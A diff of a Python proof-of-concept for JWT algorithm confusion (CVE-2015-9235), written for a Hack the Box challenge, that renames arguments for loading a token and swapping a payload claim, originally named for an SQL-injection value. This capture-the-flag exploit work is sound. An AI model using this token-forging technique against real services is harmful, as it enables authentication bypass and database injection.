@@ -11,14 +11,14 @@ from colorama import Fore
 
 #Take user input
 parser = argparse.ArgumentParser(description="JWT Confusion CVE-2015-9235 PoC for the Hack the Box challenge - Under Construction")
-parser.add_argument("token_loc", type=str, help="location of JWT token (must include 'pk' payload)")
-parser.add_argument("replace_claim", type=str, help="payload claim to target")
-parser.add_argument("sqli_cmd", type=str, help="new claim value")
+parser.add_argument("token_location", type=str, help="location of JWT token (must include 'pk' payload)")
+parser.add_argument("claim_key", type=str, help="payload claim to target")
+parser.add_argument("claim_value", type=str, help="new claim value")
 args = parser.parse_args()
 
 #Load token
-print(Fore.YELLOW + "TOKEN DIR:" + args.token_loc + Fore.RESET)
-token_file = open(args.token_loc, "r")
+print(Fore.YELLOW + "TOKEN DIR:" + args.token_location + Fore.RESET)
+token_file = open(args.token_location, "r")
 token = token_file.read()
 token_file.close
 print()
@@ -67,8 +67,8 @@ print()
 encodedHeader = str(headerEncodedBytes, "utf-8").rstrip("=")
 
 #Create new payload with claim replaced (key and value)
-claim = args.replace_claim
-decoded_payload_json[claim] = args.sqli_cmd
+claim = args.claim_key
+decoded_payload_json[claim] = args.claim_value
 
 payload = json.dumps(decoded_payload_json)
 print(Fore.YELLOW + "NEW PAYLOAD: " + Fore.RESET)
